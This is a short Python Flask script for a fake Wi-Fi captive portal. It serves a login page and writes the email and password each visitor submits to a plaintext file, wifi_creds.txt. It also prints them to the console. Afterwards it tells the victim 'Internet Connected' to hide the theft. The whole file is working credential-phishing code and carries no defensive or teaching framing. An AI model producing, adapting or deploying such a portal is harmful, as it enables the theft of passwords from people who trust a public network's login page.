from flask import Flask, render_template, request
import os

app = Flask(__name__, template_folder="../templates")

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        print(f"[+] Wi-Fi Creds: {email} | {password}")
        os.makedirs("../data/logs", exist_ok=True)
        with open("../data/logs/wifi_creds.txt", "a") as f:
            f.write(f"{email}:{password}\n")
        return "<h3>Thanks! Internet Connected.</h3>"
    return render_template("captive_portal.html")

def start_captive():
    print("[*] Captive Portal running on http://0.0.0.0:8080")
    app.run(host="0.0.0.0", port=8080)

